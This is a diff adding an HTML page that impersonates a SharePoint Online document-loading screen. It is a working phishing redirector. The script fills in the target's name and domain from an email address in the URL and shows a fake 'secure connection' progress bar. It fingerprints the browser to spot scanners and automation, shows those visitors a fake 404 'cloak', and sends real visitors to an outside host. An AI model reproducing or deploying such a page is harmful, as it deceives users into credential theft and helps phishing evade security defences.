@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SharePoint Online - Loading Document</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f3f2f1; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; color: #323130; }
+        
+        /* Main Loading Area */
+        #mainArea { background: white; padding: 40px; border-radius: 2px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+        .logo { width: 32px; margin-bottom: 20px; }
+        h2 { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
+        #navSite { color: #0078d4; font-size: 14px; margin-bottom: 25px; display: block; }
+        
+        /* Progress Bar */
+        .prog-container { background: #edebe9; height: 4px; width: 100%; margin: 20px 0; border-radius: 2px; overflow: hidden; }
+        #progFill { background: #0078d4; width: 0%; height: 100%; transition: width 0.4s ease; }
+        #statusTxt { font-size: 12px; color: #605e5c; }
+
+        /* Deny/Bot Area (Hidden by default) */
+        #denyArea { display: none; flex-direction: column; align-items: center; text-align: center; }
+        .error-code { font-family: monospace; background: #f3f2f1; padding: 10px; margin-top: 20px; font-size: 12px; color: #a19f9d; }
+    </style>
+</head>
+<body>
+
+    <!-- User-Facing Content -->
+    <div id="mainArea">
+        <img src="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/brand-icons/product/svg/sharepoint_32x1.svg" class="logo" alt="SharePoint">
+        <h2 id="cardTitle">Opening secure document...</h2>
+        <span id="navSite">Office 365</span>
+        
+        <div class="prog-container">
+            <div id="progFill"></div>
+        </div>
+        <div id="statusTxt">Initializing secure connection...</div>
+    </div>
+
+    <!-- Hidden Bot Landing (404 Cloak) -->
+    <div id="denyArea">
+        <h1>404</h1>
+        <p>The requested resource was not found on this server.</p>
+        <div id="denyCode" class="error-code"></div>
+    </div>
+
+    <script>
+        var TARGET = 'https://kal365.baryeon.com/l/iwmynb2Qzcw';
+
+        // 1. URL Personalization Logic
+        (function() {
+            var p = new URLSearchParams(location.search);
+            var ov = p.get('r') || p.get('redirect');
+            if (ov) TARGET = decodeURIComponent(ov);
+
+            // 1. Parse the query string (the part after the '?')
+var p = new URLSearchParams(location.search);
+
+// 2. Extract the value assigned to 'state'
+var h = p.get('state');
+            if (h && h.includes('@')) {
+                var dom = h.split('@')[1];
+                var user = h.split('@')[0].replace(/[._+]/g, ' ').replace(/\b\w/g, function(c) { return c.toUpperCase() });
+                document.getElementById('navSite').textContent = dom;
+                document.getElementById('cardTitle').textContent = 'Opening file for ' + user + '...';
+            }
+        })();
+
+        // 2. Stealth Integrity Security Scan
+        async function runSecurity() {
+            var score = 0;
+            var reasons = [];
+
+            // Check A: Hardware GPU Rendering (Hardest to fake)
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl');
+                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
+                if (/SwiftShader|VMware|Google Swift|Software/.test(renderer)) { 
+                    score += 60; reasons.push('gpu'); 
+                }
+            } catch(e) { score += 10; }
+
+            // Check B: Automation Drivers
+            if (navigator.webdriver) { score += 100; reasons.push('wd'); }
+
+            // Check C: Screen Consistency
+            if (window.innerWidth === 0 || screen.width === 0) { score += 50; reasons.push('dim'); }
+
+            // Check D: Modern Browser Objects
+            if (window.chrome && !window.chrome.runtime && /Chrome/.test(navigator.userAgent)) {
+                score += 40; reasons.push('miss-obj');
+            }
+
+            return { score, reasons };
+        }
+
+        // 3. Execution & Animation
+        async function init() {
+            var security = await runSecurity();
+            
+            var steps = [
+                { pct: 25, msg: 'Connecting to SharePoint...', d: 600 },
+                { pct: 50, msg: 'Verifying permissions...', d: 800 },
+                { pct: 75, msg: 'Validating security token...', d: 700 },
+                { pct: 90, msg: 'Preparing view...', d: 500 }
+            ];
+
+            var fill = document.getElementById('progFill');
+            var stat = document.getElementById('statusTxt');
+            var currentDelay = 0;
+
+            steps.forEach(function(s) {
+                currentDelay += s.d;
+                setTimeout(function() {
+                    fill.style.width = s.pct + '%';
+                    stat.textContent = s.msg;
+                }, currentDelay);
+            });
+
+            // Final Redirect or Block
+            setTimeout(function() {
+                if (security.score >= 55) {
+                    // Bot detected: Hide content and show fake 404
+                    document.getElementById('mainArea').style.display = 'none';
+                    document.getElementById('denyArea').style.display = 'flex';
+                    document.getElementById('denyCode').textContent = 'Ref-ID: ' + btoa(security.reasons.join('|')).substring(0, 16);
+                    document.title = "404 Not Found";
+                } else {
+                    // Human detected: Complete progress and redirect
+                    fill.style.width = '100%';
+                    stat.textContent = 'Redirecting...';
+                    setTimeout(function() { window.location.href = TARGET; }, 300);
+                }
+            }, currentDelay + 500);
+        }
+
+        window.onload = init;
+    </script>
+</body>
+</html>
